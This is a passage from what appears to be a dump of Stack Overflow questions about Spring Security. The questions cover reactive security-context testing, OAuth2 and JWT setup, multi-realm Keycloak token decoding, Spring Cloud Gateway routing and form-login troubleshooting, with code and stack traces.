    at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:196) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:232) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:203) ~[spring-beans-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.lambda$loadBeanDefinitionsFromImportedResources$0(ConfigurationClassBeanDefinitionReader.java:390) ~[spring-context-5.3.31.jar:5.3.31]
    at java.util.LinkedHashMap.forEach(LinkedHashMap.java:684) ~[na:1.8.0_402]
    at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitionsFromImportedResources(ConfigurationClassBeanDefinitionReader.java:354) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitionsForConfigurationClass(ConfigurationClassBeanDefinitionReader.java:156) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassBeanDefinitionReader.loadBeanDefinitions(ConfigurationClassBeanDefinitionReader.java:129) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassPostProcessor.processConfigBeanDefinitions(ConfigurationClassPostProcessor.java:343) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.annotation.ConfigurationClassPostProcessor.postProcessBeanDefinitionRegistry(ConfigurationClassPostProcessor.java:247) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanDefinitionRegistryPostProcessors(PostProcessorRegistrationDelegate.java:311) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(PostProcessorRegistrationDelegate.java:112) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:756) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:572) ~[spring-context-5.3.31.jar:5.3.31]
    at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:147) ~[spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:732) [spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:409) [spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.run(SpringApplication.java:308) [spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.run(SpringApplication.java:1300) [spring-boot-2.7.18.jar:2.7.18]
    at org.springframework.boot.SpringApplication.run(SpringApplication.java:1289) [spring-boot-2.7.18.jar:2.7.18]
</code></pre>
"
"<p><em><strong>Note.</strong> This question is related to <a href=""https://stackoverflow.com/questions/78084826/how-can-i-retain-context-while-handling-errors-with-onerrorresume"">my earlier one</a> but different. That question was about Project Reactor, this one is about Spring WebFlux Security</em></p>
<p>Here's a simple authentication filter (or rather, <em>authentication extraction</em> filter, I don't authenticate the claims here, for simplicity)</p>
<pre class=""lang-java prettyprint-override""><code>import org.springframework.http.HttpStatus;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.security.core.context.ReactiveSecurityContextHolder;
import org.springframework.security.web.server.authentication.ServerAuthenticationConverter;
import org.springframework.security.web.server.authentication.ServerHttpBasicAuthenticationConverter;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;

public class BasicWebFilter implements WebFilter {
    ServerAuthenticationConverter authenticationConverter = new ServerHttpBasicAuthenticationConverter();

    @SuppressWarnings(&quot;NullableProblems&quot;)
    @Override
    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, WebFilterChain chain) {
        return authenticationConverter.convert(exchange)
                .flatMap(authentication -&gt; chain.filter(exchange)
                        .contextWrite(ReactiveSecurityContextHolder.withAuthentication(authentication)));
    }
}
</code></pre>
<p>Suppose I want to test it. This works</p>
<pre class=""lang-java prettyprint-override""><code>package com.example.dynamicgateway.misc;

import org.junit.jupiter.api.Test;
import org.springframework.http.HttpHeaders;
import org.springframework.mock.http.server.reactive.MockServerHttpRequest;
import org.springframework.mock.web.server.MockServerWebExchange;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContext;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;
import reactor.test.StepVerifier;

import static org.mockito.BDDMockito.given;
import static org.mockito.Mockito.mock;

public class GenericTest {
    @Test
    void test() {
        String username = &quot;username&quot;, password = &quot;password&quot;;
        MockServerHttpRequest request = MockServerHttpRequest.get(&quot;/&quot;)
                .header(HttpHeaders.AUTHORIZATION, &quot;basic &quot; + HttpHeaders.encodeBasicAuth(username, password, null))
                .build();
        MockServerWebExchange exchange = MockServerWebExchange.builder(request).build();

        WebFilterChain chainMock = mock(WebFilterChain.class);
        given(chainMock.filter(exchange)).willReturn(Mono.empty());

        BasicWebFilter basicWebFilter = new BasicWebFilter();
        StepVerifier.create(basicWebFilter.filter(exchange, chainMock))
                .expectAccessibleContext()
                .assertThat(c -&gt; StepVerifier.create(c.&lt;Mono&lt;SecurityContext&gt;&gt;get(SecurityContext.class))
                        .expectNextMatches(sc -&gt; {
                            Authentication authentication = sc.getAuthentication();
                            return authentication.getPrincipal().equals(username) &amp;&amp;
                                    authentication.getCredentials().equals(password);
                        })
                        .verifyComplete())
                .then()
                .verifyComplete();
    }
}
</code></pre>
<p>However, there's a major issue with the test, it's very fragile. Here's how I can modify the filter's code to make the test fail</p>
<pre class=""lang-java prettyprint-override""><code>                .flatMap(authentication -&gt; chain.filter(exchange)
                        .contextWrite(ReactiveSecurityContextHolder.withAuthentication(authentication)))
                .onErrorResume(Exception.class, t -&gt; {
                    ServerHttpResponse response = exchange.getResponse();
                    response.setStatusCode(HttpStatus.UNAUTHORIZED);
                    return response.setComplete();
                });
</code></pre>
<p>The test fails because I assert on the most downstream operator which is no longer <code>MonoFlatMap</code> (which somehow retains original <code>Context</code>) but <code>MonoOnErrorResume</code> (which <a href=""https://stackoverflow.com/questions/78084826/how-can-i-retain-context-while-handling-errors-with-onerrorresume"">doesn't</a>)</p>
<p>What are more robust strategies to test the contents of <code>ReactiveSecurityContextHolder</code>? If it's possible, I'd prefer to keep Spring out and keep my tests truly unit (no Spring context initialization)</p>
"
"<p>I would just like to know how spring security should be implemented in spring cloud gateway at the moment!</p>
<p>I am developing an application that works with microservices, I have my user microservice, subscriptions, credit, customers, among others, I also have my registration service (eureka server) and my gateway service. Previously I managed security with a monolithic application, but now it changes everything because if I implement what I had before to this new microservices structure it does not allow me to authenticate the other endpoints that are not user (user is the microservice that normally handled all the authentication, jwt and security filters). I understand that the AuthenticationFilter is handled in the apigateway. Now, what I want to achieve is to be able to manage the different endpoints, first achieve the login, this login gives me a bearer token and with this token to be able to access the different endpoints that require authentication. But I have no idea how to do this, it should be noted that in my user service I manage user details, jwtService, among others ...</p>
"
"<p>I use Spring Security for authentication and authorization in my Spring Boot project. I want to add refresh token mechanism to the project, but as far as I see, the examples includes a separate table called Token to keep token data.</p>
<p>However, I am wondering if it would be possible to extract the current token and calculate if it is expired or not without asking to database.</p>
<p>So, do I have to create Token table for for using refresh token in Spring Security? Or can I use refresh token approach without creating a separate table?</p>
<p>video do that but i'm not very sure this is the best option</p>
"
"<p>I have a google authentication setup with spring boot v3. I have setup the authentication flow configuration as to save the authenticated google users some details in the local db with a customOAuth2UserService class with the oAuth2Login configuration in spring securities securityFilterChain bean. The authentication is succeeding and the code in oAuth2AuthenticationSuccessHandler is executing, but the details are not stored in the db, when I debug, the debugger doesn't move into customOAuth2UserUserService class. what I'm probably doing wrong, please help me to resolve or further debug this issue.</p>
<p><strong>SecurityFilterChain</strong></p>
<pre><code>@Configuration
@EnableWebSecurity
public class WebSecurityConfig {

    private final JwtAndLoginFilter jwtAndLoginFilter;
    private final CustomOAuth2UserService customOAuth2UserService;
    private final OAuth2AuthenticationSuccessHandler oAuth2AuthenticationSuccessHandler;
    private final OAuth2AuthenticationFailureHandler oAuth2AuthenticationFailureHandler;

    @Autowired
    public WebSecurityConfig(JwtAndLoginFilter jwtAndLoginFilter,
    CustomOAuth2UserService customOAuth2UserService, OAuth2AuthenticationSuccessHandler oAuth2AuthenticationSuccessHandler,
    OAuth2AuthenticationFailureHandler oAuth2AuthenticationFailureHandler) {
        this.jwtAndLoginFilter = jwtAndLoginFilter;
        this.customOAuth2UserService = customOAuth2UserService;
        this.oAuth2AuthenticationSuccessHandler = oAuth2AuthenticationSuccessHandler;
        this.oAuth2AuthenticationFailureHandler = oAuth2AuthenticationFailureHandler;
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .csrf(csrf -&gt; csrf
                        .disable())
                .sessionManagement(session -&gt; session
                        .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .formLogin(formLogin -&gt; formLogin.disable())
                .httpBasic(httpBasic -&gt; httpBasic.disable())
                .authorizeHttpRequests(authorize -&gt; authorize
                        .requestMatchers(HttpMethod.POST, &quot;/api/v1/auth/signup&quot;, &quot;/api/v1/auth/signin&quot;).permitAll()
                        .requestMatchers(&quot;/oauth2/**&quot;).permitAll()
                        .anyRequest().authenticated())
                .oauth2Login(oauth2 -&gt; {
                    oauth2.authorizationEndpoint(oauthEndpoint -&gt; {
                        oauthEndpoint.baseUri(&quot;/oauth2/authorize&quot;)
                        .authorizationRequestRepository(cookieAuthorizationRequestRepository());
                    })
                    .redirectionEndpoint(redirectionEndpoint -&gt; redirectionEndpoint.baseUri(&quot;/oauth2/callback/*&quot;))
                    .userInfoEndpoint(userInfoEndpoint -&gt; userInfoEndpoint.userService(customOAuth2UserService))
                    .successHandler(oAuth2AuthenticationSuccessHandler)
                    .failureHandler(oAuth2AuthenticationFailureHandler);
                })
                .authenticationProvider(authenticationProvider())
                .addFilterBefore(jwtAndLoginFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }
}
</code></pre>
<p><strong>CustomOAuth2UserService</strong></p>
<pre><code>@Service
public class CustomOAuth2UserService extends DefaultOAuth2UserService {

    private final OAuth2UserRepository oAuth2UserRepository;

    @Autowired
    public CustomOAuth2UserService(OAuth2UserRepository oAuth2UserRepository) {
        this.oAuth2UserRepository = oAuth2UserRepository;
    }

    @Override
    public OAuth2User loadUser(OAuth2UserRequest oAuth2UserRequest) throws OAuth2AuthenticationException {
        OAuth2User oAuth2User = super.loadUser(oAuth2UserRequest);

        try {
            return processOAuth2User(oAuth2UserRequest, oAuth2User);
        } catch (AuthenticationException ex) {
            throw ex;
        } catch (Exception ex) {
            // Throwing an instance of AuthenticationException will trigger the OAuth2AuthenticationFailureHandler
            throw new InternalAuthenticationServiceException(ex.getMessage(), ex.getCause());
        }
    }

    private OAuth2User processOAuth2User(OAuth2UserRequest oAuth2UserRequest, OAuth2User oAuth2User) {
        OAuth2UserInfo oAuth2UserInfo = OAuth2UserInfoFactory.getOAuth2UserInfo(oAuth2UserRequest.getClientRegistration().getRegistrationId(), oAuth2User.getAttributes());

        if(!StringUtils.hasLength(oAuth2UserInfo.getEmail())) {
            throw new OAuth2AuthenticationProcessingException(&quot;Email not found from OAuth2 provider&quot;);
        }

        Optional&lt;com.solutions.computic.server.security.oauth2.entities.OAuth2User&gt; userOptional = oAuth2UserRepository.findByEmail(oAuth2UserInfo.getEmail());
        com.solutions.computic.server.security.oauth2.entities.OAuth2User user;
        if(userOptional.isPresent()) {
            user = userOptional.get();
            if(!user.getProvider().equals(AuthProvider.valueOf(oAuth2UserRequest.getClientRegistration().getRegistrationId()))) {
                throw new OAuth2AuthenticationProcessingException(&quot;Looks like you're signed up with &quot; +
                        user.getProvider() + &quot; account. Please use your &quot; + user.getProvider() +
                        &quot; account to login.&quot;);
            }
            user = updateExistingUser(user, oAuth2UserInfo);
        } else {
            user = registerNewUser(oAuth2UserRequest, oAuth2UserInfo);
        }

        return UserPrincipal.create(user, oAuth2User.getAttributes());
    }

    private com.solutions.computic.server.security.oauth2.entities.OAuth2User registerNewUser(OAuth2UserRequest oAuth2UserRequest, OAuth2UserInfo oAuth2UserInfo) {
        var user = new com.solutions.computic.server.security.oauth2.entities.OAuth2User();

        user.setProvider(AuthProvider.valueOf(oAuth2UserRequest.getClientRegistration().getRegistrationId()));
        user.setProviderId(oAuth2UserInfo.getId());
        user.setName(oAuth2UserInfo.getName());
        user.setEmail(oAuth2UserInfo.getEmail());
        return oAuth2UserRepository.save(user);
    }

    private com.solutions.computic.server.security.oauth2.entities.OAuth2User updateExistingUser(com.solutions.computic.server.security.oauth2.entities.OAuth2User existingUser, 
    OAuth2UserInfo oAuth2UserInfo) {
        existingUser.setName(oAuth2UserInfo.getName());
        return oAuth2UserRepository.save(existingUser);
    }
}
</code></pre>
<p><strong>OAuth2AuthenticationSuccessHandler</strong></p>
<pre><code>@Component
@Slf4j
public class OAuth2AuthenticationSuccessHandler extends SimpleUrlAuthenticationSuccessHandler {

    private final List&lt;String&gt; authorizedRedirectUris;
    private final TokenProvider tokenProvider;
    private final HttpCookieOAuth2AuthorizationRequestRepository httpCookieOAuth2AuthorizationRequestRepository;

    @Autowired
    public OAuth2AuthenticationSuccessHandler(@Value(&quot;${authorizedRedirectUris}&quot;) List&lt;String&gt; authorizedRedirectUris, TokenProvider tokenProvider,
    HttpCookieOAuth2AuthorizationRequestRepository httpCookieOAuth2AuthorizationRequestRepository) {
        this.authorizedRedirectUris = authorizedRedirectUris;
        this.tokenProvider = tokenProvider;
        this.httpCookieOAuth2AuthorizationRequestRepository = httpCookieOAuth2AuthorizationRequestRepository;
    }

    @Override
    public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {
        String targetUrl = determineTargetUrl(request, response, authentication);

        if (response.isCommitted()) {
            log.debug(&quot;Response has already been committed. Unable to redirect to &quot; + targetUrl);
            return;
        }

        clearAuthenticationAttributes(request, response);
        getRedirectStrategy().sendRedirect(request, response, targetUrl);
    }

    protected String determineTargetUrl(HttpServletRequest request, HttpServletResponse response, Authentication authentication) {
        Optional&lt;String&gt; redirectUri = CookieUtils.getCookie(request, HttpCookieOAuth2AuthorizationRequestRepository.REDIRECT_URI_PARAM_COOKIE_NAME)
                .map(Cookie::getValue);

        if(redirectUri.isPresent() &amp;&amp; !isAuthorizedRedirectUri(redirectUri.get())) {
            throw new FoodDeliveryException(&quot;Sorry! We've got an Unauthorized Redirect URI and can't proceed with the authentication&quot;);
        }

        String targetUrl = redirectUri.orElse(getDefaultTargetUrl());

        String token = tokenProvider.createToken(authentication);

        return UriComponentsBuilder.fromUriString(targetUrl)
                .queryParam(&quot;token&quot;, token)
                .build().toUriString();
    }

    protected void clearAuthenticationAttributes(HttpServletRequest request, HttpServletResponse response) {
        super.clearAuthenticationAttributes(request);
        httpCookieOAuth2AuthorizationRequestRepository.removeAuthorizationRequestCookies(request, response);
    }

    private boolean isAuthorizedRedirectUri(String uri) {
        URI clientRedirectUri = URI.create(uri);

        return authorizedRedirectUris
                .stream()
                .anyMatch(authorizedRedirectUri -&gt; {
                    // Only validate host and port. Let the clients use different paths if they want to
                    URI authorizedURI = URI.create(authorizedRedirectUri);
                    if(authorizedURI.getHost().equalsIgnoreCase(clientRedirectUri.getHost())
                            &amp;&amp; authorizedURI.getPort() == clientRedirectUri.getPort()) {
                        return true;
                    }
                    return false;
                });
    }
}
</code></pre>
"
"<p>I want to set the <code>jwt.issuer-uri</code> based on the request URL.</p>
<p>Let's say that I have a request <code>http://hostname/realm1/request</code> then I want to set the <code>jwt.issuer-uri</code> as <code>http://keycloak-host/auth/realms/realm1</code>.</p>
<p>If a second request comes from <code>https://hostname/realm2/request</code> the the <code>jwt.issuer-uri</code> will be <code>http://keycloak-host/auth/realms/realm2</code>.</p>
<p>What I did was to create a <code>SecurityFilterChain</code> like</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
@Order(100)
public SecurityFilterChain myJwtSecFilterChain (HttpSecurity http) throws Exception {

    http.authorizeHttpRequests(auth -&gt; {
        auth.requestMatchers(&quot;/api/**&quot;).authenticated();
    });

    http.oauth2ResourceServer(oauth -&gt; {
        oauth.jwt(jwt -&gt; {
            jwt.decoder(new MyJwtDecoder());
        });
    });

    return http.build();
}
</code></pre>
<p>And then the decoder:</p>
<pre class=""lang-java prettyprint-override""><code>public class MyJwtDecoder implements JwtDecoder {
    private static final Logger LOGGER = LoggerFactory.getLogger(MyJwtDecoder.class);

    public MyJwtDecoder() {
    }

    @Override
    public Jwt decode(String token) throws JwtException {
        LOGGER.debug(&quot;*********** MyJwtDecoder - decode token {}&quot;, token);
        return getJwt(token);
    }

    private Jwt getJwt(String token) {

        Jwt result = null;
        List&lt;String&gt; realmList = List.of(&quot;realm1&quot;, &quot;realm2&quot;);
        for (String realm : realmList) {
            JwtDecoder jdLocal = JwtDecoders.fromIssuerLocation(&quot;http://keycloak-host/auth/realms/&quot; + realm);
            try {
                result = jdLocal.decode(token);
                LOGGER.info(&quot;TOKEN VALIDATED !!!!!&quot;);
                break;
            } catch (JwtValidationException vex) {
                LOGGER.info(&quot;Jwt validation exception - Stop Validation - Exception type {} - Message: {}&quot;, vex.getClass().getSimpleName(), vex.getMessage());
                throw vex;
            } catch (Exception ex) {
                // Continue with validation
                LOGGER.info(&quot;Jwt validation exception - Continue with other realms validation - Exception type {} - Message: {}&quot;, ex.getClass().getSimpleName(), ex.getMessage());
            }
        }
        return result;
    }
}
</code></pre>
<p>How can I modify the decoder to use the request URL instead of looping into the realms?</p>
<p>The other option could be to create a Filter before <code>BearerTokenAuthenticationFilter</code> but in that case how can I bind the decoder?</p>
<p>Please don't give me answers with the deprecated adapters.</p>
"
"<p>I am migrating zuul configuration into spring cloud gateway mvc. I configured following in spring boot application.yml</p>
<pre><code>spring:
  cloud:
    gateway:
      mvc:
        routes:
          - id: rabbitmq
            uri: http://localhost:15672/
            predicates:
              - Path=/rabbitmq/**
              - Method=GET, POST
            filters:
              - StripPrefix=1
</code></pre>
<p>How ever its successfully redirected in local machine but frequently failing in server with following error</p>
<pre><code>java.io.IOException: closed
    at java.net.http/jdk.internal.net.http.ResponseSubscribers$HttpResponseInputStream.current(ResponseSubscribers.java:460) ~[java.net.http:na]
    at java.net.http/jdk.internal.net.http.ResponseSubscribers$HttpResponseInputStream.read(ResponseSubscribers.java:499) ~[java.net.http:na]
    at java.base/java.io.InputStream.transferTo(InputStream.java:782) ~[na:na]
    at org.springframework.util.StreamUtils.copy(StreamUtils.java:150) ~[spring-core-6.1.4.jar:6.1.4]
    at org.springframework.cloud.gateway.server.mvc.handler.RestClientProxyExchange.lambda$doExchange$3(RestClientProxyExchange.java:52) ~[spring-cloud-gateway-server-mvc-4.1.0.jar:4.1.0]
    at org.springframework.cloud.gateway.server.mvc.handler.GatewayServerResponseBuilder$WriteFunctionResponse.writeToInternal(GatewayServerResponseBuilder.java:218) ~[spring-cloud-gateway-server-mvc-4.1.0.jar:4.1.0]
    at org.springframework.cloud.gateway.server.mvc.handler.AbstractGatewayServerResponse.writeTo(AbstractGatewayServerResponse.java:103) ~[spring-cloud-gateway-server-mvc-4.1.0.jar:4.1.0]
    at org.springframework.web.servlet.function.support.HandlerFunctionAdapter.handle(HandlerFunctionAdapter.java:111) ~[spring-webmvc-6.1.4.jar:6.1.4]
</code></pre>
<p>spring boot version= '3.2.3'
spring-cloud-starter-gateway-mvc version: 4.1.0</p>
<p>I have tried changing spring boot security config and connection time out properties with http client but nothing is working..</p>
<p>This IO exception with RestClientProxyChange should not occur in server.</p>
"
"<p>I'm trying to connect my <code>WebClient</code> to a Spring OAuth2 authorization server, and I'm using Spring Security 6. My goal is to obtain an access token programmatically. However, I'm having trouble figuring out the correct approach. Can someone provide guidance or an example of how to achieve this?</p>
<p>I've already set up my authorization server using Spring Security 6's OAuth2 features, and it seems to be working fine. Now, I need to make requests to this server from my WebClient to obtain access tokens for subsequent API calls.</p>
<p>Any insights, code snippets, or tutorials would be greatly appreciated.</p>
<p>I am trying the code from below URL:</p>
<p><a href=""https://www.baeldung.com/spring-webclient-oauth2"" rel=""nofollow noreferrer"">https://www.baeldung.com/spring-webclient-oauth2</a></p>
<p>and it is failing saying access denied on below steps.</p>
<pre><code>HTTP/1.1 302 Found
Location: http://localhost:8085/oauth/authorize?response_type=code&amp;client_id=bael-client-id&amp;state=qwdjnjcncxcxcxncwiewe&amp;redirect_uri=http://localhost:8080/login/oauth2/code/bael
</code></pre>
"
"<p>I'm planning to use Spring Security's OAuth2 ResourceServer to secure my services. However, due to certain release schedules, I cannot block access requests without a token. I'm wondering if it's possible to authenticate when a token is present and allow unauthenticated access when no token is provided?</p>
<p>I've attempted to customize the Authenticator to return a default usernamepassword identity for unauthenticated requests, but it doesn't seem to be effective.</p>
<p>Im using reactive stack.</p>
<p>Finally, I used multiple security matchers, and this approach worked.</p>
<pre><code>@Bean
public SecurityWebFilterChain oauthSecurityWebFilterChain(ServerHttpSecurity http) {
    http
        .securityMatcher(exchange -&gt; exchange.getRequest().getHeaders().containsKey(HttpHeaders.AUTHORIZATION) ?
            ServerWebExchangeMatcher.MatchResult.match() :
            ServerWebExchangeMatcher.MatchResult.notMatch()
        )
        .csrf(ServerHttpSecurity.CsrfSpec::disable)
        .cors(Customizer.withDefaults())
        .logout(ServerHttpSecurity.LogoutSpec::disable)
        .authorizeExchange(
            authorizeExchangeSpec -&gt; authorizeExchangeSpec
                .pathMatchers(&quot;/api/*/app/**&quot;).authenticated()
                .pathMatchers(&quot;/api/*/admin/**&quot;).authenticated()
                .pathMatchers(&quot;/api/*/apps/**&quot;).authenticated()
                .pathMatchers(HttpMethod.GET, &quot;/api/v1/assets/firmware/**&quot;).permitAll()
                .anyExchange().permitAll()
        )
        .oauth2ResourceServer(e -&gt; e.jwt(Customizer.withDefaults()))
        .securityContextRepository(NoOpServerSecurityContextRepository.getInstance());

    return http.build();
}

/**
 * 无需认证的 SecurityWebFilterChain
 * &lt;p&gt;
 * 兼容未添加认证的应用，后续移除
 *
 * @param http http
 * @return SecurityWebFilterChain
 */
@Bean
public SecurityWebFilterChain noAuthSecurityWebFilterChain(ServerHttpSecurity http) {
    http
        .securityMatcher(exchange -&gt; exchange.getRequest().getHeaders().containsKey(HttpHeaders.AUTHORIZATION) ?
            ServerWebExchangeMatcher.MatchResult.notMatch() :
            ServerWebExchangeMatcher.MatchResult.match()
        )
        .csrf(ServerHttpSecurity.CsrfSpec::disable)
        .cors(Customizer.withDefaults())
        .logout(ServerHttpSecurity.LogoutSpec::disable)
        .authorizeExchange(
            authorizeExchangeSpec -&gt; authorizeExchangeSpec
                .anyExchange().permitAll()
        );

    return http.build();
}
</code></pre>
"
"<p>I've been trying to use formLogin in my securityFilterChain method and for some reason it doesn't want to go in defaultSuccessUrl.</p>
<p>Here is my code:</p>
<p>SecurityConfig.class</p>
<pre><code>@Configuration
@EnableWebSecurity
@EnableMethodSecurity
@RequiredArgsConstructor
public class SecurityConfig {

    private final UserRepository userRepository;

    @Bean
    public BCryptPasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public UserDetailsService userDetailsService() {
        return username -&gt; {
            var user = userRepository.findByUsername(username);
            if (user == null) {
                throw new UsernameNotFoundException(&quot;User not found&quot;);
            }
            return user;
        };
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        var authManagerBuilder = http.getSharedObject(AuthenticationManagerBuilder.class);
        authManagerBuilder.userDetailsService(userDetailsService())
                .passwordEncoder(passwordEncoder());

        http.csrf(AbstractHttpConfigurer::disable);

        http.exceptionHandling(eh -&gt; eh.accessDeniedPage(&quot;/forbidden&quot;));

        http.formLogin(fl -&gt; fl.loginProcessingUrl(&quot;/auth&quot;) // &lt;form action &quot;/auth&quot;
                .usernameParameter(&quot;username&quot;)
                .passwordParameter(&quot;password&quot;)
                .loginPage(&quot;/login&quot;)
                .defaultSuccessUrl(&quot;/&quot;, true)
                .failureUrl(&quot;/login?error&quot;));

        http.logout(lg -&gt; lg.logoutUrl(&quot;/logout&quot;)
                .logoutSuccessUrl(&quot;/login&quot;));

        return http.build();
    }

}
</code></pre>
<p>HomeController.class</p>
<pre><code>@Controller
@RequiredArgsConstructor
public class HomeController {

    private final UserService userService;

    @PreAuthorize(&quot;isAuthenticated()&quot;)
    @GetMapping(&quot;/&quot;)
    public String homePage() {
        return &quot;home&quot;;
    }

    @PreAuthorize(&quot;isAnonymous()&quot;)
    @GetMapping(&quot;/login&quot;)
    public String loginPage() {
        return &quot;login&quot;;
    }

    @GetMapping(&quot;/forbidden&quot;)
    public String forbiddenPage() {
        return &quot;forbidden&quot;;
    }

    @PreAuthorize(&quot;isAnonymous()&quot;)
    @PostMapping(&quot;/register&quot;)
    public String createUser(User user, @RequestParam String rePassword) {
        String result = userService.registerUser(user, rePassword);
        return &quot;redirect:/login?&quot; + result;
    }

    @PreAuthorize(&quot;isAuthenticated()&quot;)
    @PostMapping(&quot;/change-password&quot;)
    public String changePassword(String currentPassword, String newPassword, String reNewPassword) {
        String result = userService.changePassword(currentPassword, newPassword, reNewPassword);
        return &quot;redirect:/?&quot; + result;
    }

}
</code></pre>
<p>login.html</p>
<pre><code>&lt;form action=&quot;/auth&quot; method=&quot;post&quot;&gt;
    &lt;div th:if=&quot;${param.success != null}&quot; class=&quot;alert alert-success alert-dismissible fade show text-center&quot; role=&quot;alert&quot;&gt;
      &lt;strong&gt;аккаунт успешно создан&lt;/strong&gt;
    &lt;/div&gt;
    &lt;div th:if=&quot;${param.errorEmail != null}&quot; class=&quot;alert alert-danger alert-dismissible fade show text-center&quot; role=&quot;alert&quot;&gt;
      &lt;strong&gt;почта занята&lt;/strong&gt;
    &lt;/div&gt;
    &lt;div th:if=&quot;${param.errorPassword != null}&quot; class=&quot;alert alert-danger alert-dismissible fade show text-center&quot; role=&quot;alert&quot;&gt;
      &lt;strong&gt;пароли не совпадают&lt;/strong&gt;
    &lt;/div&gt;
    &lt;h2&gt;Войти&lt;/h2&gt;
    &lt;div class=&quot;form-group&quot;&gt;
      &lt;label for=&quot;username&quot;&gt;Логин&lt;/label&gt;
      &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
    &lt;/div&gt;
    &lt;div class=&quot;form-group&quot;&gt;
      &lt;label for=&quot;password&quot;&gt;Пароль&lt;/label&gt;
      &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
    &lt;/div&gt;
    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Войти&lt;/button&gt;
    &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot; data-toggle=&quot;modal&quot; data-target=&quot;#registerModal&quot;&gt;Регистрация&lt;/button&gt;
  &lt;/form&gt;
</code></pre>
<p>I tried debugging it but ended up being lost in an infinite cycle in SecurityConfig, it doesn't throw any exception and sql logs are seem to be fine. Objects in DB are stored properly.</p>
"
"<p>I get this exception, deep inside org.springframework.security code
java.lang.IllegalArgumentException: Failed to find servlet [] in the servlet context</p>
<p>What could cause this?</p>
<p>I call a @RestController with @PostMapping</p>
<p>Changing my test to use another endpoint does not change the stack-trace</p>
<pre><code>    at org.springframework.util.Assert.notNull(Assert.java:172)
    at org.springframework.security.config.annotation.web.AbstractRequestMatcherRegistry$DispatcherServletDelegatingRequestMatcher.matcher(AbstractRequestMatcherRegistry.java:529)
    at org.springframework.security.web.access.intercept.RequestMatcherDelegatingAuthorizationManager.check(RequestMatcherDelegatingAuthorizationManager.java:79)
    at org.springframework.security.web.access.intercept.RequestMatcherDelegatingAuthorizationManager.check(RequestMatcherDelegatingAuthorizationManager.java:48)
    at org.springframework.security.authorization.ObservationAuthorizationManager.check(ObservationAuthorizationManager.java:63)
    at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:95)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126)
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
